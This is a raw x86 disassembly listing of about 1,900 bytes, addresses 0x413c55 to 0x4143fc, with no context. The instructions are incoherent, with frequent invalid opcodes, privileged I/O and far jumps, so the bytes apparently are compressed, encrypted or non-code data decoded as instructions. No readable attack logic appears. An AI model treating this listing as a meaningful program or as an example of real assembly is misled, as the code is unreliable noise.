  413c55:	aaa    
  413c56:	fmul   st,st(1)
  413c58:	xor    edx,DWORD PTR [edi]
  413c5a:	lahf   
  413c5b:	repz cmp BYTE PTR [eax-0x38],al
  413c5f:	(bad)  
  413c60:	lahf   
  413c61:	int    0xc7
  413c63:	add    DWORD PTR [ecx+0x7e],esi
  413c66:	adc    BYTE PTR ds:0x9c6c7f1a,cl
  413c6c:	test   ch,ch
  413c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c6f:	inc    ecx
  413c70:	ins    BYTE PTR es:[edi],dx
  413c71:	mov    WORD PTR [ebp+0x50],cs
  413c74:	neg    BYTE PTR [ebx-0x76]
  413c77:	std    
  413c78:	mov    ebp,0x6f42ab5f
  413c7d:	lds    esp,FWORD PTR [edx]
  413c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c80:	xchg   DWORD PTR [edx+eax*4-0x46fd4ecf],edx
  413c87:	leave  
  413c88:	ror    DWORD PTR [edi+0x60],cl
  413c8b:	pop    edx
  413c8c:	mov    edx,0x4eb4791f
  413c91:	dec    ecx
  413c92:	loopne 0x413ced
  413c94:	or     al,0x62
  413c96:	mov    ch,0xd4
  413c98:	fcom   QWORD PTR [ebx]
  413c9a:	xlat   BYTE PTR ds:[ebx]
  413c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c9c:	add    BYTE PTR [esi-0x5ff7dd38],dh
  413ca2:	int3   
  413ca3:	call   0x32db:0x32cb387a
  413caa:	jge    0x413c60
  413cac:	sbb    esi,DWORD PTR [edx+0x74]
  413caf:	outs   dx,BYTE PTR ds:[esi]
  413cb0:	ficomp WORD PTR fs:[ebx+0x4c]
  413cb4:	in     eax,0x86
  413cb6:	mov    WORD PTR [ecx+0x74],cs
  413cb9:	inc    esp
  413cba:	and    BYTE PTR [ecx+ecx*4-0x9],dl
  413cbe:	add    ebx,edx
  413cc0:	add    ecx,DWORD PTR [edx-0x1a]
  413cc3:	sub    BYTE PTR [eax+0x3],bl
  413cc6:	sub    al,0x32
  413cc8:	xchg   ebp,eax
  413cc9:	retf   
  413cca:	out    0x3d,al
  413ccc:	pop    es
  413ccd:	scas   al,BYTE PTR es:[edi]
  413cce:	data16 jbe 0x413d11
  413cd1:	dec    eax
  413cd2:	(bad)  
  413cd3:	mov    ecx,0xe96c9b57
  413cd8:	push   edx
  413cd9:	push   es
  413cda:	mov    bl,0xe1
  413cdc:	pop    eax
  413cdd:	cbw    
  413cdf:	mov    ebp,0xbb3d5dc9
  413ce4:	fwait
  413ce5:	jmp    0xe36e68ce
  413cea:	sub    eax,0x7e663057
  413cef:	push   ecx
  413cf0:	(bad)  
  413cf1:	and    eax,0x21c62062
  413cf6:	add    bh,BYTE PTR [esi]
  413cf8:	adc    bl,cl
  413cfa:	rcl    DWORD PTR [edi+0x1dbda22e],1
  413d00:	inc    eax
  413d01:	not    BYTE PTR [edx-0x31]
  413d04:	jo     0x413cad
  413d06:	sbb    BYTE PTR [edi-0x5da58783],ah
  413d0c:	cmc    
  413d0d:	jmp    0x413cc9
  413d0f:	inc    ebp
  413d10:	stos   BYTE PTR es:[edi],al
  413d11:	sbb    edx,DWORD PTR [edx+eax*2+0x2e39eb99]
  413d18:	cmp    eax,0xb5c70c53
  413d1d:	pop    esi
  413d1e:	test   DWORD PTR [ebx],ebp
  413d20:	mov    ah,0xa1
  413d22:	fisubr WORD PTR [esi-0x3f]
  413d25:	shr    BYTE PTR [ecx+0x4f6c8651],cl
  413d2b:	out    dx,eax
  413d2c:	imul   edi,DWORD PTR ds:0xb40c436e,0xffffffd5
  413d33:	dec    al
  413d35:	pushf  
  413d36:	adc    ecx,DWORD PTR [esi+0x78]
  413d39:	(bad)  
  413d3a:	cmp    eax,0x1edb85fa
  413d3f:	cmp    eax,0xe4d79803
  413d44:	jb     0x413dae
  413d46:	jge    0x413d4d
  413d48:	xchg   ebp,eax
  413d4a:	jle    0x413d07
  413d4c:	and    al,0x4c
  413d4e:	das    
  413d4f:	jno    0x413ce3
  413d51:	mov    dh,0xb6
  413d53:	sti    
  413d54:	scas   eax,DWORD PTR es:[edi]
  413d55:	jle    0x413d08
  413d57:	sub    DWORD PTR [edx],0x962df57c
  413d5d:	fild   WORD PTR [ecx+0x21d74bf]
  413d63:	(bad)  
  413d64:	(bad)  
  413d65:	sti    
  413d66:	jo     0x413d7b
  413d68:	push   cs
  413d69:	pop    ds
  413d6a:	pop    ebp
  413d6b:	in     al,dx
  413d6c:	sub    eax,0x7dc5d235
  413d71:	cmp    ah,ch
  413d73:	je     0x413d5d
  413d75:	xor    ecx,esp
  413d77:	pop    ebp
  413d78:	ins    DWORD PTR es:[edi],dx
  413d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d7a:	jp     0x413d90
  413d7c:	adc    eax,0x44ddf214
  413d81:	ficom  DWORD PTR [ecx-0x56]
  413d84:	(bad)  
  413d85:	push   ecx
  413d86:	fs jmp 0xd1ab:0xdb72772
  413d8e:	and    DWORD PTR [ebp-0x74],0xffffffc3
  413d92:	inc    DWORD PTR [ecx]
  413d94:	sbb    al,0xd4
  413d96:	sbb    al,0x73
  413d98:	out    0xa1,eax
  413d9a:	neg    dl
  413d9c:	loopne 0x413d7c
  413d9e:	jnp    0x413db1
  413da0:	lock adc DWORD PTR [esi-0x7c],edx
  413da4:	and    BYTE PTR [eax],0xb
  413da7:	test   eax,0xe7e82eb3
  413dac:	fld    DWORD PTR [esi+0x19]
  413daf:	loopne 0x413d78
  413db1:	mov    ah,0x2d
  413db3:	pushf  
  413db4:	cdq    
  413db5:	mov    eax,0xc8efc611
  413dba:	dec    ebp
  413dbb:	adc    al,0xfd
  413dbd:	xor    ebx,DWORD PTR [eax]
  413dbf:	(bad)  
  413dc1:	in     eax,0xd7
  413dc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dc4:	adc    ebx,esi
  413dc6:	ds inc eax
  413dc8:	push   0x9435dcac
  413dcd:	sub    esi,DWORD PTR [edx+0x56]
  413dd0:	inc    edi
  413dd1:	gs inc esp
  413dd3:	mov    ah,0x9d
  413dd5:	rcl    bl,0xe6
  413dd8:	or     al,0x8f
  413dda:	xchg   ebp,eax
  413ddb:	and    DWORD PTR ds:0x17fe0953,eax
  413de1:	or     al,BYTE PTR [edx]
  413de3:	or     DWORD PTR [ecx-0x10f8a781],esi
  413de9:	dec    ebx
  413dea:	shl    BYTE PTR [edi+0x12],0x53
  413dee:	pop    esp
  413def:	jne    0x413d94
  413df1:	(bad)  
  413df2:	outs   dx,BYTE PTR ds:[esi]
  413df3:	dec    ebp
  413df4:	sub    dh,bl
  413df6:	push   esp
  413df7:	push   ebx
  413df8:	test   eax,0x74625cd4
  413dfd:	pushf  
  413dfe:	cli    
  413dff:	(bad)  
  413e00:	jb     0x413e00
  413e02:	sub    ah,BYTE PTR [edx]
  413e04:	int3   
  413e05:	add    DWORD PTR [esi+edx*2],edx
  413e08:	imul   edi,DWORD PTR [ebp-0x11],0xd
  413e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e0d:	sbb    ebx,DWORD PTR [ecx]
  413e0f:	test   DWORD PTR [edx],ebx
  413e11:	les    edi,FWORD PTR ds:0x289531f6
  413e17:	xor    ah,0x34
  413e1a:	es clc 
  413e1c:	mov    dh,0xd1
  413e1e:	test   eax,0xfdd36746
  413e23:	repz stc 
  413e25:	sub    DWORD PTR [eax+0x40],edx
  413e28:	je     0x413e80
  413e2a:	aaa    
  413e2b:	jo     0x413e42
  413e2d:	dec    esp
  413e2e:	xchg   DWORD PTR [ebx+0x4a],esp
  413e31:	and    edi,ebx
  413e33:	inc    esi
  413e34:	mov    ds:0xc3619778,eax
  413e39:	pop    ss
  413e3a:	pushf  
  413e3b:	retf   0x459c
  413e3e:	(bad)  
  413e3f:	lods   eax,DWORD PTR ds:[esi]
  413e40:	scas   al,BYTE PTR es:[edi]
  413e41:	sti    
  413e42:	scas   eax,DWORD PTR es:[edi]
  413e43:	fsubr  DWORD PTR [ebp-0x5]
  413e46:	shl    DWORD PTR [eax],1
  413e48:	stos   BYTE PTR es:[edi],al
  413e49:	fadd   DWORD PTR es:[edi+ecx*4+0x14c9a1d0]
  413e51:	cmp    cl,al
  413e53:	dec    ebp
  413e54:	xor    dh,BYTE PTR [edx+ebx*4+0x8e1da1a]
  413e5b:	cli    
  413e5c:	hlt    
  413e5d:	xchg   edi,eax
  413e5e:	sbb    ebp,DWORD PTR [edi+0x624c1af8]
  413e64:	pop    eax
  413e65:	popf   
  413e66:	mov    ecx,0x110e0955
  413e6b:	daa    
  413e6c:	mov    al,0xd8
  413e6e:	loop   0x413ea6
  413e70:	add    DWORD PTR [eax-0x51d5d17a],0x55
  413e77:	stos   BYTE PTR es:[edi],al
  413e78:	cdq    
  413e79:	mov    ebp,0xf7a2f9fb
  413e7e:	sub    BYTE PTR [ecx+0xc],al
  413e81:	popf   
  413e82:	xor    DWORD PTR [edx-0x60],esi
  413e85:	aaa    
  413e86:	je     0x413e29
  413e88:	sbb    ecx,DWORD PTR [eax-0xc12ad3]
  413e8e:	call   0xb68:0x7284b1b5
  413e95:	pop    ebx
  413e96:	xor    edi,edx
  413e98:	pushf  
  413e99:	mov    al,ds:0x977eb29d
  413e9e:	pop    ds
  413e9f:	out    0x5f,eax
  413ea1:	pop    ebx
  413ea2:	sub    cl,ah
  413ea4:	adc    edx,ecx
  413ea6:	and    al,0xfc
  413ea8:	pop    edx
  413ea9:	aad    0xf4
  413eab:	xor    esi,DWORD PTR [ebp-0x56194d7]
  413eb1:	adc    DWORD PTR [ecx-0x676fc2e7],eax
  413eb7:	pop    ecx
  413eb8:	call   DWORD PTR [edx+0x44]
  413ebb:	fdiv   DWORD PTR [ebx]
  413ebd:	sbb    BYTE PTR [ebx-0x365dfe37],bh
  413ec3:	popa   
  413ec4:	xchg   ebx,eax
  413ec5:	or     al,0x28
  413ec7:	mov    dl,0xbf
  413ec9:	xlat   BYTE PTR ds:[ebx]
  413eca:	cdq    
  413ecb:	xchg   esi,eax
  413ecc:	dec    edi
  413ecd:	jmp    0x413f15
  413ecf:	repnz xchg ebx,eax
  413ed1:	and    BYTE PTR [ebx-0x21],0x8c
  413ed5:	sub    BYTE PTR [edi+esi*2+0x644f071],ch
  413edc:	add    BYTE PTR [edx-0x63e529ae],bh
  413ee2:	dec    edi
  413ee3:	lods   eax,DWORD PTR ds:[esi]
  413ee4:	jns    0x413f01
  413ee6:	xchg   edi,eax
  413ee7:	ror    DWORD PTR [ecx-0x10],0x29
  413eeb:	dec    edx
  413eec:	rcr    ch,cl
  413eee:	jge    0x413ec7
  413ef0:	xor    DWORD PTR [esi+eiz*1-0x71],ebp
  413ef4:	jnp    0x413e76
  413ef6:	push   ecx
  413ef7:	adc    eax,0x236f9e86
  413efc:	mov    esp,0x3219d4c0
  413f01:	loop   0x413ede
  413f03:	mov    bh,0xcd
  413f05:	inc    esi
  413f06:	mov    ecx,0xac4c4b3f
  413f0b:	out    dx,al
  413f0c:	int3   
  413f0d:	nop
  413f0e:	(bad)  
  413f0f:	mov    ebx,0xec04b4dc
  413f14:	or     dh,al
  413f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f17:	js     0x413ebf
  413f19:	mov    al,ds:0xcd9bf03f
  413f1e:	and    dl,al
  413f20:	xchg   ecx,eax
  413f21:	shrd   DWORD PTR [edi+0x38],edi,cl
  413f25:	scas   al,BYTE PTR es:[edi]
  413f26:	sub    ah,bh
  413f28:	sub    DWORD PTR [ecx],esi
  413f2a:	ins    BYTE PTR es:[edi],dx
  413f2b:	icebp  
  413f2c:	dec    eax
  413f2d:	out    0xa8,eax
  413f2f:	cmp    ah,BYTE PTR [edi]
  413f31:	sub    BYTE PTR [edx-0x1e],0x45
  413f35:	xor    DWORD PTR [ecx+0x725df852],0x4a
  413f3c:	mov    edx,0x26391fec
  413f41:	lock shl BYTE PTR [esp+esi*2],cl
  413f45:	das    
  413f46:	push   esi
  413f47:	push   ds
  413f48:	in     eax,0x61
  413f4a:	fcmovne st,st(2)
  413f4c:	mov    cl,0xcb
  413f4e:	popf   
  413f4f:	jle    0x413edf
  413f51:	sbb    cl,al
  413f53:	mov    eax,edi
  413f55:	push   eax
  413f56:	sahf   
  413f57:	cmp    bl,BYTE PTR ds:0x9512c32a
  413f5d:	ror    BYTE PTR [edx-0x6d],0x57
  413f61:	sahf   
  413f62:	push   eax
  413f63:	adc    esi,edi
  413f65:	add    eax,0x39369308
  413f6a:	jae    0x413f0d
  413f6c:	push   eax
  413f6d:	jp     0x413eff
  413f6f:	add    eax,0xa902be5c
  413f74:	shl    BYTE PTR [edx+ebx*4+0x548e4a70],cl
  413f7b:	enter  0x65bd,0x21
  413f7f:	jb     0x2a4217
  413f85:	mov    edx,0x54e4a523
  413f8a:	loope  0x413f4a
  413f8c:	dec    esi
  413f8d:	xchg   edx,eax
  413f8e:	mov    esi,0xe65df55b
  413f93:	jle    0x413f81
  413f95:	sahf   
  413f96:	or     al,0x87
  413f98:	nop
  413f99:	stc    
  413f9a:	loope  0x413f75
  413f9c:	jbe    0x413f35
  413f9e:	add    BYTE PTR [eax-0x9],0x66
  413fa2:	ficomp WORD PTR [ebx]
  413fa4:	(bad)  
  413fa5:	push   ecx
  413fa6:	jp     0x413f40
  413fa8:	aas    
  413fa9:	ja     0x413fe2
  413fab:	jnp    0x413f94
  413fad:	pop    es
  413fae:	mov    al,0xe1
  413fb0:	add    DWORD PTR [ebx+0x4e],edi
  413fb3:	cmp    eax,0x3a8abda7
  413fb8:	fidivr DWORD PTR [eax-0x6a]
  413fbb:	xor    DWORD PTR [ebx],edx
  413fbd:	loop   0x413ffc
  413fbf:	mov    ah,0xb5
  413fc1:	cwde   
  413fc2:	sbb    ebp,DWORD PTR [edi+eiz*2+0x49]
  413fc6:	(bad)  
  413fc7:	cmp    al,0x87
  413fc9:	idiv   DWORD PTR [edx+0x59e03734]
  413fcf:	out    0x6b,eax
  413fd1:	das    
  413fd2:	jle    0x413faf
  413fd4:	adc    al,0xa5
  413fd6:	ret    
  413fd7:	sahf   
  413fd8:	test   al,0xe0
  413fda:	ret    0x6060
  413fdd:	sbb    BYTE PTR fs:[edi+0x5f1c0da7],dh
  413fe4:	les    ebx,FWORD PTR [edi-0x8ec773d]
  413fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413feb:	fdiv   QWORD PTR [edi+0x52]
  413fee:	or     bh,BYTE PTR [edx-0x1e]
  413ff1:	mov    DWORD PTR [ecx-0x535ca42d],edx
  413ff7:	je     0x413feb
  413ff9:	into   
  413ffa:	mov    dl,0x5c
  413ffc:	sbb    al,0xff
  413ffe:	arpl   WORD PTR [ebp-0x472d82f4],cx
  414004:	mov    BYTE PTR [edi+esi*4-0x61],bh
  414008:	ror    DWORD PTR [esi+0x9],1
  41400b:	retf   0x8f9a
  41400e:	pop    edi
  41400f:	fwait
  414010:	mov    BYTE PTR [ebx+ebx*2-0x32],bh
  414014:	add    BYTE PTR [ecx],dl
  414016:	cdq    
  414017:	jae    0x413ffa
  414019:	jns    0x414039
  41401b:	and    BYTE PTR [edx-0x1afaec83],0x30
  414022:	push   edi
  414023:	cmp    DWORD PTR [ecx],eax
  414025:	data16 sub al,0x30
  414028:	adc    BYTE PTR [edx-0x2766cc53],dl
  41402e:	jp     0x414018
  414030:	sbb    BYTE PTR [edi*2+0x52691347],ch
  414037:	fwait
  414038:	aam    0xef
  41403a:	cwde   
  41403b:	sub    WORD PTR [edx],bp
  41403e:	sbb    eax,0xa3ef95b
  414043:	pop    ss
  414044:	loope  0x413fe3
  414046:	loop   0x414032
  414048:	add    BYTE PTR [edi+edi*1],bh
  41404b:	das    
  41404c:	cmc    
  41404d:	iret   
  41404e:	push   ebx
  41404f:	dec    ecx
  414050:	jecxz  0x413fed
  414052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414053:	sbb    ah,al
  414055:	ret    
  414056:	adc    cl,BYTE PTR [edx+0x2aed4c3a]
  41405c:	aam    0x43
  41405e:	lock adc eax,0x4991b48d
  414064:	dec    esp
  414065:	out    dx,eax
  414066:	stos   DWORD PTR es:[edi],eax
  414067:	fst    QWORD PTR [edx+0x13]
  41406a:	cwde   
  41406b:	pop    ds
  41406c:	and    eax,0xffcc8dcb
  414071:	add    cl,BYTE PTR [esi+0x74de5656]
  414077:	xchg   esi,eax
  414078:	in     al,dx
  414079:	mov    eax,0xd2f1b89a
  41407e:	enter  0x2cca,0x75
  414082:	xchg   ebx,eax
  414083:	nop
  414084:	fbstp  TBYTE PTR [edi-0x4d]
  414087:	mov    eax,esp
  414089:	jo     0x4140c8
  41408b:	rcl    BYTE PTR [esi+edi*8+0x24],cl
  41408f:	int    0x66
  414091:	daa    
  414092:	leave  
  414093:	es inc ebx
  414095:	test   al,0xce
  414097:	push   0xcd748d4
  41409c:	outs   dx,BYTE PTR ds:[esi]
  41409d:	or     DWORD PTR ss:[ecx-0x3b25e978],0xe3160c94
  4140a8:	mov    ds:0xa29b40ae,eax
  4140ad:	jp     0x4140cb
  4140af:	mov    ds:0x7d901ae3,eax
  4140b4:	xor    dh,al
  4140b6:	arpl   WORD PTR [ebx+0x381f6271],cx
  4140bc:	repnz adc cl,bl
  4140bf:	push   ss
  4140c0:	sub    BYTE PTR [edi+0x3a270356],ah
  4140c6:	fiadd  WORD PTR [eax+0x5c5eda76]
  4140cc:	std    
  4140cd:	es cld 
  4140cf:	icebp  
  4140d0:	push   edx
  4140d1:	cmp    dl,BYTE PTR [ebp-0x5e3010a2]
  4140d7:	ret    
  4140d8:	mov    bl,0x13
  4140da:	mov    dl,0x16
  4140dc:	es int 0x78
  4140df:	dec    eax
  4140e0:	std    
  4140e1:	repz frstor [edx+0x720c40d9]
  4140e8:	call   0x22f53784
  4140ed:	and    dl,ah
  4140ef:	stos   DWORD PTR es:[edi],eax
  4140f0:	hlt    
  4140f1:	cmp    DWORD PTR [eax-0x3414f4bb],edx
  4140f7:	mov    dh,0x1e
  4140f9:	xor    dh,BYTE PTR [ecx+0x7c]
  4140fc:	outs   dx,BYTE PTR gs:[esi]
  4140fe:	cmp    ah,cl
  414100:	jb     0x414151
  414102:	jmp    0xb14d:0x30aa136d
  414109:	sbb    al,al
  41410b:	xor    al,0x71
  41410d:	pusha  
  41410e:	mov    cl,0x88
  414110:	out    0x92,eax
  414112:	inc    edi
  414113:	repnz fild DWORD PTR [edx+0x2d]
  414117:	adc    al,0x1
  414119:	or     al,0xbc
  41411b:	or     al,0xbf
  41411d:	jne    0x4140f3
  41411f:	inc    ecx
  414120:	mov    ds:0xa6286942,eax
  414125:	dec    eax
  414126:	jmp    0xbb4e0357
  41412b:	cli    
  41412c:	or     dl,bl
  41412e:	xchg   ebp,eax
  41412f:	in     al,dx
  414130:	mov    ah,0xce
  414132:	inc    ebp
  414133:	cwde   
  414134:	neg    dl
  414136:	dec    edi
  414137:	inc    edi
  414138:	sti    
  414139:	sti    
  41413a:	add    eax,0x73f50715
  41413f:	mov    ebx,0x7693e284
  414144:	sub    DWORD PTR [eax-0x34],edi
  414147:	cmp    BYTE PTR [eax+eax*1],cl
  41414a:	arpl   sp,ax
  41414c:	shr    BYTE PTR [edi+ebx*4-0x1c],1
  414150:	or     DWORD PTR ds:0x12eb48a3,esi
  414156:	lahf   
  414157:	icebp  
  414158:	dec    esp
  414159:	inc    edx
  41415a:	add    ebp,DWORD PTR [esi+0x265879f3]
  414160:	and    eax,0x86c26a4
  414165:	jge    0x41411f
  414167:	jp     0x4141b5
  414169:	scas   eax,DWORD PTR es:[edi]
  41416a:	push   0x12
  41416c:	dec    esi
  41416d:	clc    
  41416e:	xor    al,0xc
  414170:	shl    BYTE PTR [eax*1-0xdb69bf8],0x20
  414178:	adc    al,0x42
  41417a:	inc    BYTE PTR [esi]
  41417c:	fild   DWORD PTR ds:0xf7e5169a
  414182:	xor    al,0xb1
  414184:	ins    BYTE PTR es:[edi],dx
  414185:	xchg   ebx,eax
  414186:	(bad)  
  414188:	mov    dh,BYTE PTR [esi]
  41418a:	add    ebx,DWORD PTR ds:0xcd6f344e
  414190:	(bad)  
  414191:	in     eax,0x30
  414193:	cmp    al,0x80
  414195:	pop    esi
  414196:	sti    
  414197:	dec    edi
  414198:	dec    edi
  414199:	and    al,0x76
  41419b:	gs mov edi,0xc9a6c300
  4141a1:	test   DWORD PTR [ebp-0x76],eax
  4141a4:	repz fcmovb st,st(7)
  4141a7:	fwait
  4141a8:	lods   eax,DWORD PTR ds:[esi]
  4141a9:	push   ss
  4141aa:	test   eax,0x41362bf9
  4141af:	retf   
  4141b0:	mov    esp,0x4d8f3937
  4141b5:	xchg   ebx,eax
  4141b6:	repnz cdq 
  4141b8:	push   ecx
  4141b9:	in     eax,dx
  4141ba:	add    dl,BYTE PTR [edx-0x1c]
  4141bd:	push   ebx
  4141be:	push   0xffffff99
  4141c0:	lds    esp,FWORD PTR [ebp-0x238d52d7]
  4141c6:	popf   
  4141c7:	mov    cl,0x76
  4141c9:	pop    esi
  4141ca:	pop    esp
  4141cb:	retf   
  4141cc:	dec    esi
  4141cd:	mov    ch,BYTE PTR [edi]
  4141cf:	popf   
  4141d0:	lock push eax
  4141d2:	sbb    DWORD PTR [ebx-0x7f],edx
  4141d5:	mov    ds:0xff0cf723,eax
  4141da:	outs   dx,BYTE PTR ds:[esi]
  4141db:	pop    esi
  4141dc:	mov    eax,ds:0xdf6095d3
  4141e1:	lahf   
  4141e2:	cld    
  4141e3:	mov    al,ds:0x7688ba34
  4141e8:	les    ecx,FWORD PTR ds:0xf6ea8d9f
  4141ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ef:	shl    dh,0x6b
  4141f2:	out    dx,eax
  4141f3:	(bad)  
  4141f4:	xchg   edi,eax
  4141f5:	xchg   esp,eax
  4141f6:	mov    ah,0x53
  4141f8:	jae    0x414190
  4141fa:	adc    dh,bh
  4141fc:	ins    BYTE PTR es:[edi],dx
  4141fd:	ret    
  4141fe:	fadd   DWORD PTR [ebx]
  414200:	xor    BYTE PTR [ebx],0x88
  414203:	imul   ebx,DWORD PTR [ebx-0x581788b7],0x20fefc5e
  41420d:	mov    DWORD PTR [esi+ebx*2+0x32f7b8c],esi
  414214:	cli    
  414215:	(bad)  
  414216:	test   al,0x4f
  414218:	dec    esp
  414219:	inc    edi
  41421a:	(bad)  
  41421b:	jbe    0x4141ef
  41421d:	jl     0x414219
  41421f:	mov    dl,ch
  414221:	inc    edx
  414222:	cvtps2pd xmm3,QWORD PTR [ebx-0x7df1db0b]
  414229:	inc    edx
  41422a:	fsubp  st(6),st
  41422c:	dec    ecx
  41422d:	loopne 0x414247
  41422f:	popa   
  414230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414231:	sub    ax,0x65cf
  414235:	push   cs
  414236:	add    DWORD PTR ds:0x61e92285,edx
  41423c:	adc    DWORD PTR [ecx],edi
  41423e:	enter  0x8046,0x33
  414242:	out    0x72,eax
  414244:	rcl    BYTE PTR [ecx-0x49313972],1
  41424a:	push   ss
  41424b:	out    dx,al
  41424c:	sahf   
  41424d:	mov    dl,0x10
  41424f:	rol    edi,cl
  414251:	(bad)  
  414252:	jl     0x4142ab
  414254:	mov    ecx,0x61773d22
  414259:	xor    BYTE PTR [ecx],0x5c
  41425c:	sar    BYTE PTR [edx-0x7c],1
  41425f:	sbb    dl,bl
  414261:	inc    edx
  414262:	imul   ecx,DWORD PTR [eax],0xa
  414265:	(bad)  ds:0x3e9b233a
  41426b:	sub    al,0xa4
  41426d:	cmc    
  41426e:	mov    dh,0xdc
  414270:	int3   
  414271:	mov    eax,0x4b5bb60e
  414276:	int3   
  414277:	xchg   esi,eax
  414278:	adc    bl,al
  41427a:	loope  0x4142ef
  41427c:	xchg   ebx,eax
  41427d:	mov    ah,0xfd
  41427f:	shl    BYTE PTR [edx],cl
  414281:	push   ss
  414282:	clc    
  414283:	push   es
  414284:	popa   
  414285:	or     BYTE PTR [edi-0xf],dh
  414288:	test   bl,bh
  41428a:	cld    
  41428b:	pop    esp
  41428c:	xlat   BYTE PTR ds:[ebx]
  41428d:	stc    
  41428e:	cmp    bl,dl
  414290:	cmp    DWORD PTR [ebp+0x50],0xeea75cbe
  414297:	enter  0x4994,0x1c
  41429b:	out    dx,eax
  41429c:	ficom  WORD PTR [esi+edi*2]
  41429f:	push   ecx
  4142a0:	int3   
  4142a1:	aaa    
  4142a2:	(bad)  
  4142a3:	adc    BYTE PTR [ebp+0x28699401],ch
  4142a9:	mov    ch,0xf8
  4142ab:	ds push ss
  4142ad:	xchg   BYTE PTR [eax+0x5c],bl
  4142b0:	imul   dx,WORD PTR [eax+0x7cf30e73],0xff82
  4142b8:	mov    esi,0xa797628
  4142bd:	nop
  4142be:	ja     0x4142ba
  4142c0:	or     eax,0x60c41eb4
  4142c5:	out    dx,al
  4142c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c7:	push   es
  4142c8:	mov    bl,0xc
  4142ca:	das    
  4142cb:	ficom  WORD PTR [ebp+edi*8+0x6c]
  4142cf:	mov    ah,0x72
  4142d1:	cmc    
  4142d2:	dec    eax
  4142d3:	adc    BYTE PTR [eax],ch
  4142d5:	inc    ecx
  4142d6:	dec    esi
  4142d7:	add    ebx,DWORD PTR [di+0x36]
  4142db:	dec    ecx
  4142dc:	jmp    0x414298
  4142de:	sbb    eax,0xfcecbfca
  4142e3:	mov    ecx,0x99345bd5
  4142e8:	jp     0x4142df
  4142ea:	mov    al,ds:0x89a2e101
  4142ef:	dec    ecx
  4142f0:	(bad)  
  4142f2:	jns    0xa0997d23
  4142f8:	inc    esp
  4142f9:	pop    ebx
  4142fa:	fwait
  4142fb:	xor    DWORD PTR [esi],eax
  4142fd:	add    esp,DWORD PTR [eax-0x79e3f6d4]
  414303:	scas   eax,DWORD PTR es:[edi]
  414304:	inc    edi
  414305:	inc    edi
  414306:	cmp    esi,edi
  414308:	ss mov ah,0x88
  41430b:	mov    esp,0x76bbffd6
  414310:	add    al,0x5f
  414312:	cmp    eax,0x428d963c
  414317:	mov    al,0x85
  414319:	adc    cl,bh
  41431b:	mov    ebp,0x358b429d
  414320:	pop    eax
  414321:	in     al,0x7b
  414323:	xor    bh,BYTE PTR [ecx+0x2c27297]
  414329:	pop    edx
  41432a:	mov    WORD PTR [eax-0x37],ss
  41432d:	xchg   edx,eax
  41432e:	mov    gs,WORD PTR [edx]
  414330:	fsubr  st(0),st
  414332:	ins    DWORD PTR es:[edi],dx
  414333:	xor    BYTE PTR [esi-0x18],bl
  414336:	push   edi
  414337:	mov    bh,0xc7
  414339:	adc    esp,DWORD PTR [edx+0x60]
  41433c:	(bad)  
  41433e:	jmp    FWORD PTR [eax]
  414340:	icebp  
  414341:	mov    al,ds:0x595b0489
  414346:	(bad)  
  414347:	lods   al,BYTE PTR ds:[esi]
  414348:	push   edi
  414349:	xchg   BYTE PTR [ebx+0x20],al
  41434c:	fst    DWORD PTR [ebx+esi*8]
  41434f:	gs jl  0x414363
  414352:	call   0x7b93:0x4155e0e8
  414359:	adc    al,0x5a
  41435b:	dec    ecx
  41435c:	shr    bh,1
  41435e:	xor    BYTE PTR [edx],0x34
  414361:	mov    es,esi
  414363:	mov    ah,0xd4
  414365:	pushf  
  414366:	in     al,0x87
  414368:	test   DWORD PTR [ebx-0x47],ebp
  41436b:	pop    ebx
  41436c:	inc    edi
  41436d:	int3   
  41436e:	in     al,dx
  41436f:	cmp    eax,0xaed000fe
  414374:	push   ebx
  414375:	xchg   BYTE PTR [ebx+0x71],dh
  414378:	ret    
  414379:	popf   
  41437a:	sub    edx,ebp
  41437c:	xor    ebp,ecx
  41437e:	pop    edx
  41437f:	in     al,dx
  414380:	inc    edx
  414381:	adc    ebx,ebx
  414383:	in     eax,0x52
  414385:	enter  0x90fc,0x6b
  414389:	lock and BYTE PTR [ecx],dh
  41438c:	dec    ebx
  41438d:	pop    ss
  41438e:	in     eax,dx
  41438f:	push   ecx
  414390:	test   al,0x1b
  414392:	push   ds
  414393:	xor    BYTE PTR [edi-0x38],cl
  414396:	dec    esi
  414397:	jno    0x414407
  414399:	cmp    BYTE PTR [ebp-0x2f],bl
  41439c:	scas   eax,DWORD PTR es:[edi]
  41439d:	pop    esi
  41439e:	pushw  0xffcc
  4143a1:	ret    
  4143a2:	jo     0x414369
  4143a4:	cdq    
  4143a5:	adc    DWORD PTR es:[esi-0x192f93e],ebp
  4143ac:	shl    DWORD PTR [ebx],cl
  4143ae:	(bad)  
  4143af:	dec    esi
  4143b1:	or     DWORD PTR [edi+edi*2-0x430f86b8],edx
  4143b8:	sar    ch,1
  4143ba:	xor    ebp,0x7169ebe0
  4143c0:	mov    dl,0x84
  4143c2:	xor    cl,dh
  4143c4:	mov    eax,ds:0x22985348
  4143c9:	jmp    0xcafd468b
  4143ce:	xchg   ebx,eax
  4143cf:	out    0xf,eax
  4143d1:	jne    0x4143ea
  4143d3:	lods   al,BYTE PTR ds:[esi]
  4143d4:	mov    dl,0x63
  4143d6:	push   0xffffff88
  4143d8:	out    0xc4,eax
  4143da:	sub    BYTE PTR [edx-0x26],0x31
  4143de:	dec    edi
  4143df:	jbe    0x4143ad
  4143e1:	jbe    0x414418
  4143e3:	out    0xb2,eax
  4143e5:	jecxz  0x4143df
  4143e7:	(bad)  
  4143e8:	cld    
  4143e9:	pop    esi
  4143ea:	retf   
  4143eb:	jno    0x41438c
  4143ed:	call   0xc8b6:0xdbf4719
  4143f4:	push   esi
  4143f5:	hlt    
  4143f6:	pop    edi
  4143f7:	call   0x6268b77c
  4143fc:	in     eax,0x7f
